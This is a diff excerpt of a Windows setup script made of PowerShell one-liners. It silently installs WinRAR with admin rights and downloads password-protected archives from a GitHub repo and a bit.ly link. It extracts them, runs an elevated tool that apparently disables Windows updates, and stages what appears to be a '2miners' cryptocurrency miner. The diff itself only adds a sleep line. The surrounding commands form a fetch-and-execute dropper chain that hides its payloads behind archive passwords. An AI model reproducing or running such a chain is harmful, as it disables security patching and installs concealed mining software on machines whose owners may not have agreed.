@@ -7,6 +7,7 @@ powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://www.win-rar.com/
 powershell -NoProfile -Command "Start-Process -FilePath 'C:\winrar-x64-701.exe' -ArgumentList '/S' -Verb RunAs"
 powershell -NoProfile -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/main/Disable-update-windows.rar -OutFile C:\Disable-update-windows.rar"
 powershell -NoProfile -Command "& 'C:\Program Files\WinRAR\WinRAR.exe' x -pPITVN -ibck -y 'C:\Disable-update-windows.rar' 'C:\'"
+powershell -NoProfile -Command "Start-Sleep -Seconds 4"
 powershell -NoProfile -Command "Start-Process -FilePath 'C:\Disable-update-windows\Wub_x64.exe' -Verb RunAs -NoNewWindow"
 powershell -NoProfile -Command "Invoke-WebRequest -Uri https://bit.ly/2miners-github -OutFile C:\setup.rar"
 powershell -NoProfile -Command "& 'C:\Program Files\WinRAR\WinRAR.exe' x -p2miners -ibck -y 'C:\setup.rar' 'C:\'"
